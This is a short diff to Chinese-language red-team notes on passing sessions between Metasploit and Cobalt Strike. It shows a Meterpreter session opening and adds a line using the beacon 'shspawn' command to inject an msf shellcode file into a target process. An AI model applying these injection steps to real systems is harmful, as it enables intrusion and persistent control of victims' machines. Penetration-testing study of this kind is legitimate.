@@ -93,6 +93,13 @@ msf6 exploit(multi/handler) > exploit
 [*] Meterpreter session 2 opened (10.10.5.120:8080 -> 10.10.17.231:53793)
 ```
 
+
+## 也可以使用```shspawn```命令进行注入
+```
+beacon> shspawn x64 C:\Payloads\msf_http_x64.bin
+```
+
+
 # 从msf的session注入Cobalt Strike的payload到靶机的进程中
 
 1. Cobalt Strike生成payload, select Raw as the Output type and select Use x64 payload
